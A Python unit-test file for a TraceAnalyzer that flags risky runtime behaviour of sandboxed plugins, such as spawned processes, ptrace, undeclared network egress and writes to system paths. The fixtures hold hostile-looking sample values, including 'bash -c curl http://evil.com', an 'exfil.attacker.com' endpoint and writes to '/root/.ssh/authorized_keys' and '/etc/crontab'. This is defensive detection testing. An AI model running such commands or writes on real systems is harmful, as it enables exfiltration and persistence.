"""
test_trace_analyzer.py
───────────────────────
Unit tests for TraceAnalyzer — one test per rule plus edge cases.

All tests operate purely on ExecutionTrace + SkillManifest objects; no Docker
daemon is required.

Rule coverage:
  L3-DYN-001  processes_spawned → CRITICAL, execve_detected flag
  L3-DYN-002  ptrace syscall → CRITICAL, ptrace_attempted flag
  L3-DYN-003  mmap_rwx syscall → HIGH, rwx_mmap_detected flag
  L3-DYN-004  undeclared network egress → HIGH, undeclared_network_egress flag
  L3-DYN-005  high entropy output → MEDIUM, high_entropy_output flag
  L3-DYN-006  files written outside /tmp → HIGH, filesystem_write_outside_scope flag
  L3-DYN-007  timeout/OOM killed → MEDIUM (no dedicated flag on RiskReport_L3)
"""
from __future__ import annotations

import pytest

from scanner.layer3_dynamic.trace_analyzer import TraceAnalyzer
from scanner.models.skill_manifest import Permission, Severity

from tests.unit.test_layer3.conftest import make_manifest, make_trace


@pytest.fixture
def analyzer() -> TraceAnalyzer:
    return TraceAnalyzer()


# ─── Baseline: clean trace ────────────────────────────────────────────────────

class TestCleanTrace:
    def test_no_findings_on_empty_trace(self, analyzer):
        trace = make_trace()
        manifest = make_manifest()
        matches, flags = analyzer.analyze(trace, manifest)
        assert matches == []
        assert flags == {}

    def test_clean_trace_no_flags(self, analyzer):
        trace = make_trace(entropy=3.0)
        manifest = make_manifest(Permission.NETWORK_EGRESS)
        matches, flags = analyzer.analyze(trace, manifest)
        assert matches == []


# ─── L3-DYN-001: Subprocess execution ────────────────────────────────────────

class TestL3Dyn001:
    def test_fires_on_processes_spawned(self, analyzer):
        trace = make_trace(processes=["bash -c curl http://evil.com"])
        matches, flags = analyzer.analyze(trace, make_manifest())
        rule_ids = [m.rule_id for m in matches]
        assert "L3-DYN-001" in rule_ids

    def test_severity_is_critical(self, analyzer):
        trace = make_trace(processes=["ls"])
        matches, flags = analyzer.analyze(trace, make_manifest())
        dyn001 = next(m for m in matches if m.rule_id == "L3-DYN-001")
        assert dyn001.severity == Severity.CRITICAL

    def test_execve_detected_flag_set(self, analyzer):
        trace = make_trace(processes=["bash"])
        _, flags = analyzer.analyze(trace, make_manifest())
        assert flags.get("execve_detected") is True

    def test_does_not_fire_on_empty_processes(self, analyzer):
        trace = make_trace(processes=[])
        matches, flags = analyzer.analyze(trace, make_manifest())
        assert all(m.rule_id != "L3-DYN-001" for m in matches)
        assert "execve_detected" not in flags

    def test_composite_score_blocks_on_execve(self, analyzer):
        """A single execve finding should push composite_score past BLOCK threshold."""
        from scanner.models.risk_report import RiskReport_L3
        trace = make_trace(processes=["bash"], syscalls=["execve"])
        matches, flags = analyzer.analyze(trace, make_manifest())
        report = RiskReport_L3(
            trace=trace,
            matches=matches,
            execve_detected=flags.get("execve_detected", False),
        )
        # execve_detected bonus=2.0 → score > 0.75
        assert report.composite_score >= 0.75


# ─── L3-DYN-002: ptrace syscall ──────────────────────────────────────────────

class TestL3Dyn002:
    def test_fires_on_ptrace_in_syscalls(self, analyzer):
        trace = make_trace(syscalls=["connect", "ptrace"])
        matches, flags = analyzer.analyze(trace, make_manifest())
        assert any(m.rule_id == "L3-DYN-002" for m in matches)

    def test_severity_is_critical(self, analyzer):
        trace = make_trace(syscalls=["ptrace"])
        matches, _ = analyzer.analyze(trace, make_manifest())
        dyn002 = next(m for m in matches if m.rule_id == "L3-DYN-002")
        assert dyn002.severity == Severity.CRITICAL

    def test_ptrace_attempted_flag_set(self, analyzer):
        trace = make_trace(syscalls=["ptrace"])
        _, flags = analyzer.analyze(trace, make_manifest())
        assert flags.get("ptrace_attempted") is True

    def test_does_not_fire_without_ptrace(self, analyzer):
        trace = make_trace(syscalls=["connect", "getaddrinfo"])
        matches, flags = analyzer.analyze(trace, make_manifest(Permission.NETWORK_EGRESS))
        assert all(m.rule_id != "L3-DYN-002" for m in matches)


# ─── L3-DYN-003: mmap_rwx ────────────────────────────────────────────────────

class TestL3Dyn003:
    def test_fires_on_mmap_rwx(self, analyzer):
        trace = make_trace(syscalls=["mmap_rwx"])
        matches, flags = analyzer.analyze(trace, make_manifest())
        assert any(m.rule_id == "L3-DYN-003" for m in matches)

    def test_severity_is_high(self, analyzer):
        trace = make_trace(syscalls=["mmap_rwx"])
        matches, _ = analyzer.analyze(trace, make_manifest())
        dyn003 = next(m for m in matches if m.rule_id == "L3-DYN-003")
        assert dyn003.severity == Severity.HIGH

    def test_rwx_mmap_detected_flag_set(self, analyzer):
        trace = make_trace(syscalls=["mmap_rwx"])
        _, flags = analyzer.analyze(trace, make_manifest())
        assert flags.get("rwx_mmap_detected") is True

    def test_does_not_fire_on_regular_mmap(self, analyzer):
        trace = make_trace(syscalls=["mmap"])
        matches, _ = analyzer.analyze(trace, make_manifest())
        assert all(m.rule_id != "L3-DYN-003" for m in matches)


# ─── L3-DYN-004: Undeclared network egress ───────────────────────────────────

class TestL3Dyn004:
    def test_fires_when_network_undeclared(self, analyzer):
        trace = make_trace(network_attempts=["evil.com:443"])
        manifest = make_manifest()  # no permissions declared
        matches, flags = analyzer.analyze(trace, manifest)
        assert any(m.rule_id == "L3-DYN-004" for m in matches)

    def test_does_not_fire_when_network_declared(self, analyzer):
        trace = make_trace(network_attempts=["api.example.com:443"])
        manifest = make_manifest(Permission.NETWORK_EGRESS)
        matches, flags = analyzer.analyze(trace, manifest)
        assert all(m.rule_id != "L3-DYN-004" for m in matches)
        assert "undeclared_network_egress" not in flags

    def test_undeclared_network_egress_flag_set(self, analyzer):
        trace = make_trace(network_attempts=["1.2.3.4:80"])
        _, flags = analyzer.analyze(trace, make_manifest())
        assert flags.get("undeclared_network_egress") is True

    def test_does_not_fire_on_empty_network_attempts(self, analyzer):
        trace = make_trace(network_attempts=[])
        matches, _ = analyzer.analyze(trace, make_manifest())
        assert all(m.rule_id != "L3-DYN-004" for m in matches)

    def test_severity_is_high(self, analyzer):
        trace = make_trace(network_attempts=["evil.com:443"])
        matches, _ = analyzer.analyze(trace, make_manifest())
        dyn004 = next(m for m in matches if m.rule_id == "L3-DYN-004")
        assert dyn004.severity == Severity.HIGH

    def test_evidence_snippet_contains_endpoint(self, analyzer):
        trace = make_trace(network_attempts=["exfil.attacker.com:443"])
        matches, _ = analyzer.analyze(trace, make_manifest())
        dyn004 = next(m for m in matches if m.rule_id == "L3-DYN-004")
        assert "exfil.attacker.com" in dyn004.evidence[0].snippet


# ─── L3-DYN-005: High entropy output ─────────────────────────────────────────

class TestL3Dyn005:
    def test_fires_at_threshold(self, analyzer):
        trace = make_trace(entropy=7.0)
        matches, flags = analyzer.analyze(trace, make_manifest())
        assert any(m.rule_id == "L3-DYN-005" for m in matches)

    def test_fires_above_threshold(self, analyzer):
        trace = make_trace(entropy=7.9)
        matches, flags = analyzer.analyze(trace, make_manifest())
        assert any(m.rule_id == "L3-DYN-005" for m in matches)
        assert flags.get("high_entropy_output") is True

    def test_does_not_fire_below_threshold(self, analyzer):
        trace = make_trace(entropy=6.99)
        matches, flags = analyzer.analyze(trace, make_manifest())
        assert all(m.rule_id != "L3-DYN-005" for m in matches)
        assert "high_entropy_output" not in flags

    def test_severity_is_medium(self, analyzer):
        trace = make_trace(entropy=7.5)
        matches, _ = analyzer.analyze(trace, make_manifest())
        dyn005 = next(m for m in matches if m.rule_id == "L3-DYN-005")
        assert dyn005.severity == Severity.MEDIUM

    def test_entropy_value_in_rationale(self, analyzer):
        trace = make_trace(entropy=7.1234)
        matches, _ = analyzer.analyze(trace, make_manifest())
        dyn005 = next(m for m in matches if m.rule_id == "L3-DYN-005")
        assert "7.1234" in dyn005.rationale


# ─── L3-DYN-006: Files written outside /tmp ──────────────────────────────────

class TestL3Dyn006:
    def test_fires_on_write_outside_tmp(self, analyzer):
        trace = make_trace(files_written=["/etc/crontab"])
        matches, flags = analyzer.analyze(trace, make_manifest())
        assert any(m.rule_id == "L3-DYN-006" for m in matches)
        assert flags.get("filesystem_write_outside_scope") is True

    def test_does_not_fire_on_write_inside_tmp(self, analyzer):
        trace = make_trace(files_written=["/tmp/safe_output.txt"])
        matches, flags = analyzer.analyze(trace, make_manifest())
        assert all(m.rule_id != "L3-DYN-006" for m in matches)
        assert "filesystem_write_outside_scope" not in flags

    def test_does_not_fire_on_empty_files_written(self, analyzer):
        trace = make_trace(files_written=[])
        matches, _ = analyzer.analyze(trace, make_manifest())
        assert all(m.rule_id != "L3-DYN-006" for m in matches)

    def test_mixed_paths_fires(self, analyzer):
        trace = make_trace(files_written=["/tmp/ok.txt", "/root/.ssh/authorized_keys"])
        matches, flags = analyzer.analyze(trace, make_manifest())
        assert any(m.rule_id == "L3-DYN-006" for m in matches)


# ─── L3-DYN-007: Container resource exhaustion ───────────────────────────────

class TestL3Dyn007:
    def test_fires_on_timeout(self, analyzer):
        trace = make_trace(timeout_killed=True)
        matches, _ = analyzer.analyze(trace, make_manifest())
        assert any(m.rule_id == "L3-DYN-007" for m in matches)

    def test_fires_on_oom(self, analyzer):
        trace = make_trace(oom_killed=True)
        matches, _ = analyzer.analyze(trace, make_manifest())
        assert any(m.rule_id == "L3-DYN-007" for m in matches)

    def test_does_not_fire_on_clean_exit(self, analyzer):
        trace = make_trace(timeout_killed=False, oom_killed=False)
        matches, _ = analyzer.analyze(trace, make_manifest())
        assert all(m.rule_id != "L3-DYN-007" for m in matches)

    def test_severity_is_medium(self, analyzer):
        trace = make_trace(timeout_killed=True)
        matches, _ = analyzer.analyze(trace, make_manifest())
        dyn007 = next(m for m in matches if m.rule_id == "L3-DYN-007")
        assert dyn007.severity == Severity.MEDIUM


# ─── Multiple rules firing simultaneously ─────────────────────────────────────

class TestMultipleRules:
    def test_all_rules_can_fire_simultaneously(self, analyzer):
        trace = make_trace(
            network_attempts=["evil.com:443"],
            processes=["bash"],
            syscalls=["execve", "ptrace", "mmap_rwx"],
            entropy=7.5,
            timeout_killed=True,
            files_written=["/etc/passwd"],
        )
        matches, flags = analyzer.analyze(trace, make_manifest())
        rule_ids = {m.rule_id for m in matches}
        assert "L3-DYN-001" in rule_ids
        assert "L3-DYN-002" in rule_ids
        assert "L3-DYN-003" in rule_ids
        assert "L3-DYN-004" in rule_ids
        assert "L3-DYN-005" in rule_ids
        assert "L3-DYN-006" in rule_ids
        assert "L3-DYN-007" in rule_ids
        assert flags.get("execve_detected") is True
        assert flags.get("undeclared_network_egress") is True
        assert flags.get("high_entropy_output") is True
        assert flags.get("ptrace_attempted") is True
        assert flags.get("rwx_mmap_detected") is True
        assert flags.get("filesystem_write_outside_scope") is True
